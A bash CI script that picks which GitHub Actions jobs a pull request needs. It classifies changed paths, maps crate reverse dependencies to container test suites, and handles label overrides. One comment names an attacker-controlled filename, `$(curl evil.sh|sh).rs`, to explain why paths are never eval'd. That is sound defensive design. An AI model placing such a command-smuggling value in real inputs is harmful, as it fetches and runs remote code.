#!/usr/bin/env bash
#
# Decide which CI jobs a change actually needs, and write the answers to
# $GITHUB_OUTPUT.
#
# Why this is a script and not `on: paths:` or a filter action:
#
#   * A workflow skipped by `on: paths:` never reports its checks at all, and a
#     required check that never reports blocks the pull request forever. A
#     skipped *job* reports success. So the workflow must always run and the
#     filtering must happen per job — which `on: paths:` cannot express.
#     `on: paths:` also has a silent false negative: past 3,000 changed files it
#     may skip the workflow outright.
#
#   * The container-suite selection below is a reverse-dependency closure over
#     the crate graph. No filter action can express that; it is not a glob.
#
#   * It keeps the pull-request path free of third-party actions. Nothing here
#     runs code we do not own.
#
# Classification is an ignore-list, not an allow-list: anything not recognised
# as documentation counts as code. An allow-list fails *open* — a new source
# directory silently stops being tested, and nothing tells you. This shape fails
# closed, which is the error worth having.
#
# Usage:
#   scripts/ci-changes.sh              # emit outputs (reads env, see below)
#   scripts/ci-changes.sh --self-test  # verify the container map against cargo
#
# Environment:
#   EVENT_NAME  github.event_name
#   BASE_SHA    github.event.pull_request.base.sha  (pull_request only)
#   HEAD_SHA    github.event.pull_request.head.sha  (pull_request only)
#   PR_AUTHOR   github.event.pull_request.user.login  (NOT github.actor, which
#               is whoever last triggered the run and changes on a re-run)
#
# Filenames are attacker-controlled — a branch may legally contain a file called
# `$(curl evil.sh|sh).rs`. Every path here is handled as data: read into a
# variable, matched with bash pattern matching, never eval'd and never
# interpolated into a command line.
#
# What this script cannot defend against: a `pull_request` run executes the pull
# request's *own* copy of it, so a change here narrows the CI of the very change
# proposing it. That is inherent to `pull_request` — the alternative,
# `pull_request_target`, runs the base copy but hands a writable token to a job
# alongside untrusted code, which is a far worse trade. The same property
# applies to scripts/attribution.sh and to the workflow files themselves, and
# the compensating control is the same in all three cases: `.github/` and
# `scripts/` are CODEOWNERS paths, and reviewing what a diff does to CI is part
# of reviewing the diff. `--self-test` checks the container map, not this
# classification path.

set -euo pipefail

# Workspace packages that own `#[ignore]`d container tests. Everything else in
# the workspace has no container suite to run. `--self-test` derives this same
# set from the source tree and fails if the two disagree.
CONTAINER_PKGS="spate spate-kafka spate-clickhouse spate-s3 spate-coordination"

# Reverse-dependency closure: given a changed crate, which container suites can
# its change possibly break? Derived from the path dependencies in each
# crates/*/Cargo.toml — `--self-test` checks this against `cargo metadata`, so
# it cannot drift silently.
#
#   spate-core         is depended on by every crate
#   spate-test         is a dev-dependency of avro, json, kafka, clickhouse, s3, spate
#                    (note: NOT coordination, which uses its own `testing` feature)
#   spate-coordination is depended on by s3 and the facade
#   the connectors   are optional dependencies of the facade only
#
# Note this answers "can it break", not "does it exercise". The facade's own
# container tests drive Kafka and ClickHouse, so a change confined to
# `crates/spate-s3` still boots those via `-p spate` even though no facade test
# touches S3. Keeping the honest closure costs those boots; narrowing it by hand
# would buy them back at the price of a table `cargo metadata` can no longer
# verify. The closure wins — but do not describe this as running "nothing else".
container_suites_for() {
    case "$1" in
        spate-core) echo "$CONTAINER_PKGS" ;;
        spate-test) echo "spate spate-kafka spate-clickhouse spate-s3" ;;
        spate-coordination) echo "spate spate-coordination spate-s3" ;;
        spate-s3) echo "spate spate-s3" ;;
        spate-kafka) echo "spate spate-kafka" ;;
        spate-clickhouse) echo "spate spate-clickhouse" ;;
        # spate-json reaches spate-s3 as a dev-dependency: the object-store
        # framing bench frames with `NdjsonFramer` rather than a local copy,
        # so a change to the framer can break spate-s3's suite.
        spate-json) echo "spate spate-s3" ;;
        spate-avro | spate) echo "spate" ;;
        *) echo "" ;;
    esac
}

# ---------------------------------------------------------------------------
# Self-test: assert the table above still matches the real dependency graph.
# Runs in the `deny` job, which already has a toolchain. `cargo metadata
# --no-deps` reads manifests only and does not resolve the registry.
#
# Both the crate list and the container-package set are derived, never named
# here. An earlier version hard-coded the crate list on both sides of the
# comparison, which meant `cargo metadata` was only ever consulted about crates
# the table already knew about — so adding a whole new connector crate left the
# guard green while its container suite ran nowhere.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Label overrides.
# ---------------------------------------------------------------------------
# `ci: docker`, `ci: loom` and `ci: bench` force a suite on for a pull request
# whose changed paths would not have selected it.
#
# They can only add. `apply_ci_labels` appends to the list it was handed and
# never assigns over it, so its result is a superset of its input by
# construction; `--self-test` asserts that. Keep it that way — the classifier
# fails closed on purpose, and an override able to clear a selection would make
# it fail open.
#
# Removing a label turns nothing off; it stops adding, and the path-derived
# baseline stands.
apply_ci_labels() {
    local labels=",${1:-},"
    local suites="$2"
    if [[ "$labels" == *",ci: docker,"* ]]; then
        suites="$suites $CONTAINER_PKGS"
    fi
    echo "$suites"
}

ci_label_wants_loom() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: loom,"* ]]
}

# The instruction-count benches. Selected by path below as well; the label is
# for the change whose effect on the hot path the paths cannot see — a
# dependency swap, or a refactor that moves code between crates.
ci_label_wants_bench() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: bench,"* ]]
}

if [[ "${1:-}" == "--self-test" ]]; then
    repo_root=$(git rev-parse --show-toplevel)

    # Every case asserts that what comes out still contains everything that went
    # in. `spate-kafka` stands in for "the paths already selected something", so
    # an override that replaced rather than appended is caught here.
    for labels in "" "ci: docker" "ci: loom" "ci: bench" "ci: docker,ci: loom" \
        "ci: bench,ci: docker" "crate: spate-s3,ci: docker" "area: ci"; do
        for before in "" "spate-kafka" "$CONTAINER_PKGS"; do
            after=$(apply_ci_labels "$labels" "$before")
            for pkg in $before; do
                if [[ " $after " != *" $pkg "* ]]; then
                    echo "::error::apply_ci_labels dropped '$pkg' (labels='$labels', before='$before')."
                    echo "Label overrides must only ever add suites; see the note above the function."
                    exit 1
                fi
            done
        done
    done

    # The docker label also has to do something: the guard above would pass on a
    # function that ignored its input entirely.
    if [[ " $(apply_ci_labels "ci: docker" "") " != *" spate-kafka "* ]]; then
        echo "::error::'ci: docker' no longer forces the container suites on."
        exit 1
    fi
    # Every predicate must recognise exactly its own label, and no other. The
    # labels share a prefix, so a pattern that lost one of its comma anchors
    # would match a neighbour and quietly widen what a label turns on.
    if ! ci_label_wants_loom "ci: loom" ||
        ci_label_wants_loom "ci: docker" ||
        ci_label_wants_loom "ci: bench"; then
        echo "::error::ci_label_wants_loom no longer recognises exactly the loom label."
        exit 1
    fi
    if ! ci_label_wants_bench "ci: bench" ||
        ci_label_wants_bench "ci: docker" ||
        ci_label_wants_bench "ci: loom" ||
        ci_label_wants_bench ""; then
        echo "::error::ci_label_wants_bench no longer recognises exactly the bench label."
        exit 1
    fi

    # Additivity, for an output that is a boolean rather than a set: `bench` is
    # selected by paths OR label, so the only way the label could ever subtract
    # is by ceasing to match once a second label arrives. Both orderings, since
    # a pull request carries its labels in whatever order they were applied.
    for other in "ci: docker" "ci: loom" "crate: spate-s3" "area: ci"; do
        if ! ci_label_wants_bench "ci: bench,$other" ||
            ! ci_label_wants_bench "$other,ci: bench"; then
            echo "::error::'ci: bench' stopped matching alongside '$other'."
            exit 1
        fi
    done

    # Which crates actually own container tests, according to the source tree?
    derived_pkgs=""
    for dir in "$repo_root"/crates/*/; do
        if grep -rqE '#\[ignore' "$dir" --include='*.rs' 2>/dev/null; then
            derived_pkgs="$derived_pkgs $(basename "$dir")"
        fi
    done
    want=$(echo "$CONTAINER_PKGS" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    got=$(echo "$derived_pkgs" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    if [[ "$want" != "$got" ]]; then
        echo "::error::CONTAINER_PKGS no longer matches the crates carrying #[ignore]d tests."
        echo "  declared: $want"
        echo "  in tree:  $got"
        echo "Update CONTAINER_PKGS in scripts/ci-changes.sh."
        exit 1
    fi

    metadata=$(cargo metadata --no-deps --format-version 1)

    # The crate list comes from cargo, so a new workspace member is compared
    # like any other and an empty row in the table shows up as a mismatch.
    crates=$(echo "$metadata" | python3 -c \
        'import json,sys; print("\n".join(sorted(p["name"] for p in json.load(sys.stdin)["packages"])))')

    expected=$(
        while IFS= read -r crate; do
            [[ -z "$crate" ]] && continue
            sorted=$(container_suites_for "$crate" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
            printf '%s\t%s\n' "$crate" "${sorted% }"
        done <<<"$crates"
    )

    # The Python below is quoted with single quotes on purpose: it must reach
    # the interpreter verbatim, with no shell expansion of its `$` or backticks.
    # shellcheck disable=SC2016
    actual=$(echo "$metadata" | CONTAINER="$CONTAINER_PKGS" python3 -c '
import json, os, sys

CONTAINER = set(os.environ["CONTAINER"].split())
meta = json.load(sys.stdin)
names = {p["name"] for p in meta["packages"]}

# Forward edges, normal + dev, restricted to workspace-internal packages.
# Self-edges are the `testing`-feature dev-dependencies and carry no
# information about which other crate a change can reach.
deps = {
    p["name"]: {d["name"] for d in p["dependencies"]
                if d["name"] in names and d["name"] != p["name"]}
    for p in meta["packages"]
}

def dependents(target):
    """Every package that transitively depends on target, plus target itself."""
    seen, frontier = {target}, [target]
    while frontier:
        cur = frontier.pop()
        for pkg, ds in deps.items():
            if cur in ds and pkg not in seen:
                seen.add(pkg)
                frontier.append(pkg)
    return seen

for crate in sorted(names):
    suites = " ".join(sorted(dependents(crate) & CONTAINER))
    print("{}\t{}".format(crate, suites))
')
    if [[ "$expected" != "$actual" ]]; then
        echo "::error::container_suites_for() no longer matches the crate graph."
        echo "Update the table in scripts/ci-changes.sh. Table says (<) vs cargo metadata (>):"
        diff <(echo "$expected") <(echo "$actual") || true
        exit 1
    fi
    echo "container_suites_for() matches the crate graph, CONTAINER_PKGS matches the tree,"
    echo "and the label overrides are additive."
    exit 0
fi

# ---------------------------------------------------------------------------
# Collect the changed paths.
# ---------------------------------------------------------------------------
force_all=0
changed_file=$(mktemp)
trap 'rm -f "$changed_file"' EXIT

case "${EVENT_NAME:-}" in
pull_request)
    # Against the *merge base*, not the base branch tip. `base.sha` is the tip,
    # so a two-dot diff also reports everything main has gained since this
    # branch last moved — on an active repository that is most of the time, and
    # the scoping quietly stops applying.
    #
    # `--no-renames` because rename detection prints only the destination path:
    # `git mv crates/spate-s3/src/foo.rs docs/foo.rs` would otherwise look like a
    # docs-only change while deleting compiled source. That is a fail-*open*,
    # which is the one failure mode this classifier is built to avoid.
    #
    # `-z` because `core.quotePath` defaults to true, so a non-ASCII path is
    # emitted C-quoted (`"docs/caf\303\251.mdx"`) and matches none of the
    # patterns below. NUL-separated output cannot survive a command
    # substitution, hence the temporary file.
    if ! merge_base=$(git merge-base "${BASE_SHA:-}" "${HEAD_SHA:-}" 2>/dev/null) ||
        [[ -z "$merge_base" ]]; then
        echo "note: no merge base for ${BASE_SHA:-?}..${HEAD_SHA:-?}; running everything."
        force_all=1
    elif ! git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
        "$merge_base" "${HEAD_SHA}" >"$changed_file" 2>/dev/null; then
        echo "note: could not diff ${merge_base}..${HEAD_SHA}; running everything."
        force_all=1
    fi
    ;;
*)
    # push, merge_group, schedule, workflow_dispatch. A merge queue entry has no
    # pull-request diff to reason about, and a push to main is the last line of
    # defence. Both get the full suite; correctness beats minutes here.
    force_all=1
    ;;
esac

# ---------------------------------------------------------------------------
# Classify.
# ---------------------------------------------------------------------------
rust=false
site=false
bench=false
suites=""

if [[ "$force_all" == "1" ]]; then
    rust=true
    site=true
    bench=true
    suites="$CONTAINER_PKGS"
else
    while IFS= read -r -d '' file; do
        [[ -z "$file" ]] && continue

        # First match wins, and the order is load-bearing. In a bash `case`
        # pattern `*` matches `/` as well, so a bare `*.md` arm would also
        # swallow crates/spate/README.md — and a crate README can be compiled
        # into the library with `#![doc = include_str!(...)]`. Claiming the
        # source trees first is what keeps the prose arm honest.
        case "$file" in
        # Committed benchmark datasets are chart data the site reads at build
        # time, not code.
        benchmarks/results/*)
            site=true
            continue
            ;;
        # Source trees: always code, whatever the file extension. Empty body,
        # so control falls past the `case` to the classification below.
        crates/* | benchmarks/* | scripts/*) ;;
        # CI definitions decide what every other job does, so a change to one
        # has to be exercised by the full set.
        .github/workflows/* | .github/actions/*) ;;
        # The rest of `.github/` cannot reach a Rust build or the site.
        # Dependabot config and issue templates are still audited, because
        # zizmor scans all of `.github/` and never carries a filter.
        .github/*)
            continue
            ;;
        # --- documentation and site sources: no Rust build needed ------------
        docs/* | website/*)
            site=true
            continue
            ;;
        # Root-level prose and repo furniture.
        *.md | LICENSE | .gitignore | .dockerignore)
            continue
            ;;
        esac

        # --- everything else is code ----------------------------------------
        rust=true

        # Which container suites can this file reach?
        case "$file" in
        crates/*)
            crate="${file#crates/}"
            crate="${crate%%/*}"
            suites="$suites $(container_suites_for "$crate")"
            ;;
        # A dependency or lint change moves the whole graph. So does a change to
        # the workflows, the composite action, the Makefile the workflow steps
        # call, or this script — the last one decides what runs at all, so it
        # has to prove itself against everything.
        Cargo.lock | Cargo.toml | deny.toml | rust-toolchain.toml | .config/* | \
            .github/workflows/* | .github/actions/* | scripts/* | Makefile)
            suites="$suites $CONTAINER_PKGS"
            site=true
            ;;
        esac

        # Which changes get their instruction counts compared automatically?
        # spate-core (the chain rigs) and spate-avro (decode). The unit is the
        # whole crate, not the module a bench happens to import, because
        # codegen is crate-global — an edit anywhere in a measured crate can
        # shift inlining and with it the count.
        #
        # This is deliberately narrower than the set of crates that *have*
        # benches. spate-s3 has them and is not listed: every benched crate
        # costs two builds and two valgrind runs, merge base and head, so
        # selecting all of them here would tax ordinary pull requests to
        # measure code they did not touch. The rest are opt-in through the
        # `ci: bench` label, which selects everything — so a change that means
        # to move one of those counts has to ask for the comparison.
        #
        # A separate `case` rather than arms on the one above, because the
        # two questions have different answers for the same file.
        case "$file" in
        crates/spate-core/* | crates/spate-avro/*)
            bench=true
            ;;
        esac
    done <"$changed_file"
fi

# A dependency bump touches Cargo.lock, which by the rule above reaches every
# container suite — so an unmodified Dependabot week would boot SeaweedFS, NATS,
# Kafka and ClickHouse once per bump, and again on every rebase when a sibling
# PR merges. These pull requests keep the whole cheap tier (lint, deny, the full
# test suite, each-feature, MSRV) and give up only the container suites, which
# the push-to-main run re-runs in full minutes after the merge.
if [[ "${PR_AUTHOR:-}" == "dependabot[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: dependabot pull request; container suites deferred to push-to-main."
    suites=""
fi

# The release pull request release-plz keeps open against `main` is the same
# trade at a better price. Its whole diff is `Cargo.toml` and `Cargo.lock`, which
# the dependency rule above answers with every container suite — so the cheapest
# diff this classifier ever sees gets the most expensive classification it has.
# And it gets it repeatedly: release-plz rewrites that branch on every push to
# `main`, so the boots are paid once per merge, not once per release.
#
# The safety argument is stronger here than for Dependabot. A bump changes real
# dependency code; this branch's source tree is byte-identical to the `main`
# commit that just ran the container suites on push. What is new is version
# strings, and what those can break is covered without a container: an
# inconsistent `=` internal pin or a lock file stale against the manifests fails
# the lint, test, MSRV and each-feature tiers, all of which run `--locked`, and
# the public-API diff is `semver_check` in release-plz.toml, which runs while the
# pull request is composed rather than on it.
if [[ "${PR_AUTHOR:-}" == "spate-release[bot]" && "${EVENT_NAME:-}" == "pull_request" ]]; then
    echo "note: release pull request; container suites deferred to push-to-main."
    suites=""
fi

# Applied after the deferrals above, so labelling a Dependabot or release pull
# request `ci: docker` overrides one for that one bump.
before_labels="$suites"
suites=$(apply_ci_labels "${PR_LABELS:-}" "$suites")
if [[ "$suites" != "$before_labels" ]]; then
    echo "note: 'ci: docker' label present; container suites forced on."
fi

loom=false
if ci_label_wants_loom "${PR_LABELS:-}"; then
    echo "note: 'ci: loom' label present; loom models forced on."
    loom=true
fi

if ci_label_wants_bench "${PR_LABELS:-}"; then
    echo "note: 'ci: bench' label present; instruction counts forced on."
    bench=true
fi

# Deduplicate and render as cargo -p arguments.
container_args=""
if [[ -n "${suites// /}" ]]; then
    for pkg in $(echo "$suites" | tr ' ' '\n' | grep -v '^$' | sort -u); do
        container_args="$container_args -p $pkg"
    done
    container_args="${container_args# }"
fi

# ---------------------------------------------------------------------------
# Emit.
# ---------------------------------------------------------------------------
{
    echo "rust=$rust"
    echo "site=$site"
    echo "containers=$([[ -n "$container_args" ]] && echo true || echo false)"
    echo "container-args=$container_args"
    echo "loom=$loom"
    echo "bench=$bench"
} | tee -a "${GITHUB_OUTPUT:-/dev/stdout}"
